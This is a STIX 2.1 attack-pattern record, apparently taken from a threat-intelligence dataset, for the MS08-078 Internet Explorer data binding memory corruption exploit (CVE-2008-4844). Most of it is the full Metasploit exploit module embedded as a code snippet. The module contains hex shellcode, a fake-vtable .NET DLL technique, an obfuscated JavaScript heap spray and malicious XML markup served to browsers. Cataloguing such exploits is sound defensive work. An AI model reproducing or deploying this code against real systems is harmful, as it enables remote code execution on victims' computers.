{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--abb63794-79dc-43c9-bf63-453a11c81e20",
    "created": "2024-08-14T16:41:12.302241Z",
    "modified": "2024-08-14T16:41:12.302245Z",
    "name": "MS08-078 Microsoft Internet Explorer Data Binding Memory Corruption",
    "description": " This module exploits a vulnerability in the data binding feature of Internet Explorer. In order to execute code reliably, this module uses the .NET DLL memory technique pioneered by Alexander Sotirov and Mark Dowd. This method is used to create a fake vtable at a known location with all methods pointing to our payload. Since the .text segment of the .NET DLL is non-writable, a prefixed code stub is used to copy the payload into a new memory segment and continue execution from there.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms08_078_xml_corruption.rb",
            "external_id": "ms08_078_xml_corruption.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4844"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20080913064223/http://taossa.com/archive/bh08sotirovdowd.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #\n  # Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn\n  #\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #\t:ua_name    => HttpClients::IE,\n  #\t:ua_minver  => \"7.0\",\n  #\t:ua_maxver  => \"7.0\",\n  #\t:javascript => true,\n  #\t:os_name => OperatingSystems::Match::WINDOWS,\n  #\t:vuln_test  => nil, # no way to test without just trying it\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS08-078 Microsoft Internet Explorer Data Binding Memory Corruption',\n      'Description'    => %q{\n        This module exploits a vulnerability in the data binding feature of Internet\n      Explorer. In order to execute code reliably, this module uses the .NET DLL\n      memory technique pioneered by Alexander Sotirov and Mark Dowd. This method is\n      used to create a fake vtable at a known location with all methods pointing\n      to our payload. Since the .text segment of the .NET DLL is non-writable, a\n      prefixed code stub is used to copy the payload into a new memory segment and\n      continue execution from there.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'hdm'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2008-4844'],\n          ['OSVDB', '50622'],\n          ['BID', '32721'],\n          ['MSB', 'MS08-078'],\n          ['URL', 'https://web.archive.org/web/20080913064223/http://taossa.com/archive/bh08sotirovdowd.pdf'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'StackAdjustment' => -3500,\n\n          # Temporary stub virtualalloc() + memcpy() payload to RWX page\n          'PrependEncoder' =>\n            \"\\xe8\\x56\\x00\\x00\\x00\\x53\\x55\\x56\\x57\\x8b\\x6c\\x24\\x18\\x8b\\x45\\x3c\"+\n            \"\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x32\"+\n            \"\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff\\xfc\\x31\\xc0\\xac\\x38\\xe0\\x74\\x07\"+\n            \"\\xc1\\xcf\\x0d\\x01\\xc7\\xeb\\xf2\\x3b\\x7c\\x24\\x14\\x75\\xe1\\x8b\\x5a\\x24\"+\n            \"\\x01\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\"+\n            \"\\xeb\\x02\\x31\\xc0\\x5f\\x5e\\x5d\\x5b\\xc2\\x08\\x00\\x5e\\x6a\\x30\\x59\\x64\"+\n            \"\\x8b\\x19\\x8b\\x5b\\x0c\\x8b\\x5b\\x1c\\x8b\\x1b\\x8b\\x5b\\x08\\x53\\x68\\x54\"+\n            \"\\xca\\xaf\\x91\\xff\\xd6\\x6a\\x40\\x5e\\x56\\xc1\\xe6\\x06\\x56\\xc1\\xe6\\x08\"+\n            \"\\x56\\x6a\\x00\\xff\\xd0\\x89\\xc3\\xeb\\x0d\\x5e\\x89\\xdf\\xb9\\xe8\\x03\\x00\"+\n            \"\\x00\\xfc\\xf3\\xa4\\xff\\xe3\\xe8\\xee\\xff\\xff\\xff\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2008-12-07',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    @state ||= {}\n\n    ibase = 0x13370000\n    vaddr = ibase + 0x2065\n\n    uri,token = request.uri.split('?', 2)\n\n\n    if(token)\n      token,trash = token.split('=')\n    end\n\n    if !(token and @state[token])\n\n      print_status(\"Sending #{self.name} init HTML\")\n      token = rand_text_numeric(32)\n      if (\"/\" == get_resource[-1,1])\n        dll_uri = get_resource[0, get_resource.length - 1]\n      else\n        dll_uri = get_resource\n      end\n      dll_uri << \"/generic-\" + Time.now.to_i.to_s + \".dll\"\n\n      html = <<-EOS\n<html>\n<head>\n<script language=\"javascript\">\n  function forward() {\n    window.location = window.location + '?#{token}';\n  }\n\n  function start() {\n    setTimeout(\"forward()\", 2000);\n  }\n</script>\n</head>\n<body onload=\"start()\">\n  <object classid=\"#{dll_uri}?#{token}#GenericControl\">\n  <object>\n</body>\n</html>\nEOS\n      @state[token] = :start\n      # Transmit the compressed response to the client\n      send_response(cli, html, { 'Content-Type' => 'text/html' })\n      return\n    end\n\n    if (uri.match(/\\.dll/i))\n\n      print_status(\"Sending DLL\")\n\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      # First entry points to the table of pointers\n      vtable  = [ vaddr + 4 ].pack(\"V\")\n      cbase   = ibase + 0x2065 + (256 * 4)\n\n      # Build a function table\n      255.times { vtable << [cbase].pack(\"V\") }\n\n      # Append the shellcode\n      vtable << p.encoded\n      send_response(\n        cli,\n        Msf::Util::EXE.to_dotnetmem(ibase, vtable),\n        {\n          'Content-Type' => 'application/x-msdownload',\n          'Connection'   => 'close',\n          'Pragma'       => 'no-cache'\n        }\n      )\n      @state[token] = :dll\n      return\n    end\n\n\n\n    html = \"\"\n    data = \"==gPOFEUT9CPK4DVYVEV9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQ\" +\n      \"EBiTBB1U8ogPM1EVI1zUBRVQNJ1TGFEVBREID1DRMZUQUFERgk0I9MkUTFEVBREI\" +\n      \"OFEUTxjC+QFWFRVPTFEVB1kUPZUQUFERgMUPExkRBRVQEBSSj0zQSNVQUFERg4UQ\" +\n      \"QNFPK4DTNRFS9MVQUFUTS9kRBRVQEByQ9QETGFEVBREIJNSPDJ1UBRVQEBiTBB1U\" +\n      \"8ogPM1EWvwjPJ1DRJBCTNhFPK4DTNRFS9MVQUFUTS9kRBRVQEByQ9QETGFEVBREI\" +\n      \"JNSPDJ1UBRVQEBiVJREP\"\n    data = data.reverse.unpack(\"m*\")[0]\n\n\n    #\n    # .NET DLL MODE\n    #\n    if(@state[token] == :dll)\n      print_status(\"Sending exploit HTML (Using .NET DLL)\")\n\n      addr_a,addr_b = [vaddr].pack(\"V\").unpack(\"v*\").map{|v| \"&##{v};\" }\n      bxml = Rex::Text.to_hex(%Q|\n<XML ID=I>\n  <X>\n    <C>\n      <![CDATA[\n        <image\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n        >\n      ]]>\n    </C>\n  </X>\n</XML>\n\n#{data}\n\n<script>\n  setTimeout('window.location.reload(true);', 250);\n</script>\n    |, '%')\n\n    var_unescape  = rand_text_alpha(rand(100) + 1)\n    var_start     = rand_text_alpha(rand(100) + 1)\n\n    html = %Q|<html>\n<head>\n<script>\n  function #{var_start}() {\n    var #{var_unescape} = unescape;\n    document.write(#{var_unescape}('#{bxml}'));\n  }\n</script>\n</head>\n<body onload=\"#{var_start}()\">\n</body>\n</html>\n    |\n\n    #\n    # HEAP SPRAY MODE\n    #\n    else\n      print_status(\"Sending exploit HTML (Using Heap Spray)\")\n\n      addr_a,addr_b = [0x0c0c0c0c].pack(\"V\").unpack(\"v*\").map{|v| \"&##{v};\" }\n      bxml = Rex::Text.to_hex(%Q|\n<XML ID=I>\n  <X>\n    <C>\n      <![CDATA[\n        <image\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n          SRC=\\\\\\\\#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}#{addr_a}#{addr_b}.X\n        >\n      ]]>\n    </C>\n  </X>\n</XML>\n\n#{data}\n\n<script>\n  setTimeout('window.location.reload(true);', 1000);\n</script>\n    |, '%')\n\n    var_memory    = rand_text_alpha(rand(100) + 1)\n    var_boom      = rand_text_alpha(rand(100) + 1)\n    var_body      = rand_text_alpha(rand(100) + 1)\n    var_unescape  = rand_text_alpha(rand(100) + 1)\n    var_shellcode = rand_text_alpha(rand(100) + 1)\n    var_spray     = rand_text_alpha(rand(100) + 1)\n    var_start     = rand_text_alpha(rand(100) + 1)\n    var_i         = rand_text_alpha(rand(100) + 1)\n\n    rand_html     = rand_text_english(rand(400) + 500)\n\n    html = <<-EOS\n<html>\n<head>\n<script>\n  var #{var_memory} = new Array();\n  var #{var_unescape} = unescape;\n\n\n  function #{var_boom}() {\n    document.getElementById('#{var_body}').innerHTML = #{var_unescape}('#{bxml}');\n  }\n\n  function #{var_start}() {\n\n    var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');\n\n    var #{var_spray} = #{var_unescape}( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"c\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"c\" );\n\n    do { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0xd0000 );\n\n    for(#{var_i} = 0; #{var_i} < 100; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};\n\n    setTimeout('#{var_boom}()', 1000);\n  }\n</script>\n</head>\n<body onload=\"#{var_start}()\" id=\"#{var_body}\">\n#{rand_html}\n</body>\n</html>\nEOS\n\n    end\n\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-12-07",
    "x_mitre_platforms": [
        "win'"
    ]
}